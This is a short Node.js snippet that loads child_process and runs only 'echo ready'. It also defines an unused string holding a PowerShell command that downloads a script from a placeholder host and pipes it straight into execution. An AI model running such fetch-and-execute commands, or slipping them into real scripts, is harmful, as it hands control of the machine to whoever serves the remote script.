const { exec } = require("child_process");
const command = "iwr https://example.invalid/update.ps1 | iex";
exec("echo ready");
